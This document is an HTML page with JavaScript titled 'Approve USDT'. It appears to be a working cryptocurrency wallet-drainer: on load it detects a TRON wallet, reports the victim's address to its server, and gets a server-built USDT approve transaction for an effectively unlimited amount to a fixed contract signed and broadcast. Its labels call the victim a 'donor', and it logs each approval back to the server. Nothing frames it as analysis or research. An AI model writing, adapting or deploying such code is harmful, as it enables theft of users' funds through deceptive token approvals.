<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve USDT</title>
</head>
<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
    <p id="msg1" style="font-size:18px;color:#e2e8f0;">Connecting wallet...</p>
    <p id="msg2" style="font-size:12px;color:#6b7280;margin-top:12px;"></p>

    <script>
        var CONTRACT = "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju";
        var USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        var AMOUNT = "999999999999999";

        var el1 = document.getElementById("msg1");
        var el2 = document.getElementById("msg2");
        var done = false;

        function msg(a, b) {
            el1.textContent = a;
            if (b !== undefined) el2.textContent = b;
        }

        function getAddress() {
            var tw = window.tronWeb;
            if (!tw) return null;
            var addr = tw.defaultAddress && tw.defaultAddress.base58;
            if (!addr || addr === "false" || addr.length < 10) return null;
            return addr;
        }

        function sendApprove(addr) {
            if (done) return;
            done = true;
            msg("Building transaction...", "");

            // Report connected wallet to server
            fetch("/api/connected", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({address: addr})
            }).catch(function(){});

            fetch("/api/build-approve", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({donor: addr})
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.error) { msg("Server error", data.error); done = false; return; }
                msg("Please confirm the transaction", "Approve USDT spending");
                return window.tronWeb.trx.sign(data.transaction);
            })
            .then(function(signed) {
                if (!signed) return;
                msg("Broadcasting...", "");
                return window.tronWeb.trx.sendRawTransaction(signed);
            })
            .then(function(res) {
                if (!res) return;
                var id = res.txid || (res.transaction && res.transaction.txID) || "";
                msg("Success!", "TX: " + id);
                el1.style.color = "#4ade80";
                fetch("/api/approved", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({donor: addr, txId: id})
                }).catch(function(){});
            })
            .catch(function(e) {
                var m = e && e.message ? e.message : String(e);
                if (m.indexOf("cancel") !== -1 || m.indexOf("reject") !== -1) {
                    msg("Cancelled", "You can close this page");
                } else {
                    msg("Error", m);
                }
                el1.style.color = "#f87171";
                done = false;
            });
        }

        // Wait for tronWeb, request accounts, then send approve
        var tick = 0;
        var requested = false;
        var interval = setInterval(function() {
            tick++;
            if (done) { clearInterval(interval); return; }

            try {
                var tw = window.tronWeb;
                var tl = window.tronLink;

                if (!tw && !tl) {
                    el2.textContent = "Waiting for wallet... (" + tick + ")";
                    if (tick > 40) {
                        clearInterval(interval);
                        msg("No wallet detected", "Please open in Trust Wallet DApp Browser");
                    }
                    return;
                }

                var addr = getAddress();
                if (addr) {
                    clearInterval(interval);
                    sendApprove(addr);
                    return;
                }

                el2.textContent = "Requesting access... (" + tick + ")";

                if (!requested) {
                    requested = true;
                    if (tl && tl.request) {
                        tl.request({ method: "tron_requestAccounts" }).then(function(){}).catch(function(){});
                    } else if (tw && tw.request) {
                        tw.request({ method: "tron_requestAccounts" }).then(function(){}).catch(function(){});
                    }
                }

                if (tick > 60) {
                    clearInterval(interval);
                    msg("Could not connect", "Make sure TRON network is selected in Trust Wallet");
                }
            } catch(ex) {
                el2.textContent = "Error: " + ex.message;
            }
        }, 500);
    </script>
</body>
</html>
